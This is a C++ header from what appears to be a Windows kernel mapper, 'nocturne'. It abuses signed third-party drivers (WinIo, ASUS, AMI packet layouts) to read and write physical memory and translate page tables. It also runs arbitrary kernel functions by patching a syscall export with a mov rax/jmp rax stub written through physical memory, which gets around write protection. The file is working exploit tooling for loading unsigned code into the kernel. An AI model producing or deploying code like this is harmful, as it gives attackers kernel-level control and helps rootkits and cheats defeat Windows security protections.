#pragma once
#include <windows.h>
#include <cstdint>
#include <vector>
#include <string>
#include "config.hpp"

namespace nocturne {

#pragma pack(push, 1)
struct WinIoPhysPacket {
    uint64_t size;
    uint64_t physAddress;
    uint64_t sectionHandle;
    uint64_t mappedLinearAddress;
    uint64_t sectionObject;
};

struct AsusPhysPacket {
    uint64_t sectionObject;
    uint64_t mappedLinearAddress;
    uint64_t physAddress;
    uint32_t size;
    uint32_t padding;
};

struct AmiPhysPacket {
    uint64_t physAddress;
    uint64_t mappedLinearAddress;
    uint32_t size;
    uint32_t flags;
};

union PageTableEntry {
    uint64_t value;
    struct {
        uint64_t present : 1;
        uint64_t readWrite : 1;
        uint64_t userSupervisor : 1;
        uint64_t pageWriteThrough : 1;
        uint64_t pageCacheDisable : 1;
        uint64_t accessed : 1;
        uint64_t dirty : 1;
        uint64_t largePage : 1;
        uint64_t global : 1;
        uint64_t ignored1 : 3;
        uint64_t pageFrameNumber : 36;
        uint64_t reserved : 4;
        uint64_t ignored2 : 11;
        uint64_t noExecute : 1;
    };
};
#pragma pack(pop)

class CarrierIo {
public:
    explicit CarrierIo(const MapperConfig& cfg);
    ~CarrierIo();

    CarrierIo(const CarrierIo&) = delete;
    CarrierIo& operator=(const CarrierIo&) = delete;

    bool Connect();
    void Disconnect();
    bool IsConnected() const { return m_hDevice != INVALID_HANDLE_VALUE; }

    // Physical memory mapping primitives via non-Intel signed carrier
    uint8_t* MapPhysical(uint64_t physAddr, size_t size, void* outStateBuffer, size_t stateBufSize);
    bool UnmapPhysical(void* stateBuffer, size_t stateBufSize);

    bool ReadPhysical(uint64_t physAddr, void* buffer, size_t size);
    bool WritePhysical(uint64_t physAddr, const void* buffer, size_t size);

    // Page table & Virtual-to-Physical translation
    bool InitializePageTables();
    uint64_t TranslateLinearAddress(uint64_t directoryTableBase, uint64_t virtualAddress, uint64_t* outPtePhysAddr = nullptr);

    bool ReadKernelVirtual(uint64_t virtualAddr, void* buffer, size_t size);
    bool WriteKernelVirtual(uint64_t virtualAddr, const void* buffer, size_t size);

    template <typename T>
    bool ReadVal(uint64_t virtualAddr, T& outVal) {
        return ReadKernelVirtual(virtualAddr, &outVal, sizeof(T));
    }

    template <typename T>
    bool WriteVal(uint64_t virtualAddr, const T& val) {
        return WriteKernelVirtual(virtualAddr, &val, sizeof(T));
    }

    // Kernel module & export resolution (User-mode pre-mapped image + Kernel VA calculation)
    bool ResolveLocalSystemSymbols(SymbolConfig& ioSymbols);
    uint64_t GetKernelModuleBase(const std::string& moduleName, uint32_t* outSize = nullptr);
    uint64_t GetKernelModuleExport(uint64_t kernelModuleBase, const std::string& exportName);
    uint64_t FindPatternInModule(uint64_t kernelModuleBase, const char* pattern, const char* mask, const char* sectionFilter = nullptr);
    uint64_t ResolveRelativeRip(uint64_t instructionAddr, uint32_t offsetOffset, uint32_t instructionSize);

    const SymbolConfig& ResolvedSymbols() const { return m_cfg.symbols; }
    uint64_t NtoskrnlBase() const { return m_ntoskrnlBase; }
    uint64_t SystemCr3() const { return m_systemCr3; }

    // Synchronous kernel execution via temporary export inline redirect on caller thread
    template <typename RetT, typename... ArgsT>
    bool CallKernelFunction(RetT* outResult, uint64_t targetKernelFuncAddr, ArgsT... args) {
        static_assert(sizeof...(ArgsT) <= 4, "NtAddAtom SSDT stub passes at most 4 register arguments (RCX, RDX, R8, R9)");
        if (!targetKernelFuncAddr || !m_ntoskrnlBase) return false;

        uint64_t hookExportKernelVa = GetKernelModuleExport(m_ntoskrnlBase, m_cfg.symbols.syscallHookExport);
        if (!hookExportKernelVa) return false;

        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) return false;
        void* userSyscallProc = reinterpret_cast<void*>(GetProcAddress(hNtdll, m_cfg.symbols.syscallHookExport.c_str()));
        if (!userSyscallProc) return false;

        // 12-byte mov rax, imm64; jmp rax shellcode stub
        uint8_t jmpStub[12] = {
            0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, targetKernelFuncAddr
            0xFF, 0xE0                          // jmp rax
        };
        *reinterpret_cast<uint64_t*>(&jmpStub[2]) = targetKernelFuncAddr;

        uint8_t originalBytes[sizeof(jmpStub)] = {};
        if (!ReadKernelVirtual(hookExportKernelVa, originalBytes, sizeof(originalBytes))) {
            return false;
        }

        // Translate to physical address and write directly to bypass read-only CR0.WP virtual page protection
        uint64_t exportPhys = TranslateLinearAddress(m_systemCr3, hookExportKernelVa);
        if (!exportPhys) return false;

        if (!WritePhysical(exportPhys, jmpStub, sizeof(jmpStub))) {
            return false;
        }

        using FnCast = RetT(__stdcall*)(ArgsT...);
        FnCast fn = reinterpret_cast<FnCast>(userSyscallProc);
        RetT res{};
        if constexpr (!std::is_void_v<RetT>) {
            res = fn(args...);
        } else {
            fn(args...);
        }

        // Immediately restore original bytes (LIFO invariant)
        WritePhysical(exportPhys, originalBytes, sizeof(originalBytes));

        if constexpr (!std::is_void_v<RetT>) {
            if (outResult) *outResult = res;
        }
        return true;
    }

private:
    MapperConfig m_cfg;
    HANDLE m_hDevice = INVALID_HANDLE_VALUE;
    uint64_t m_ntoskrnlBase = 0;
    uint32_t m_ntoskrnlSize = 0;
    uint64_t m_systemCr3 = 0;
};

} // namespace nocturne
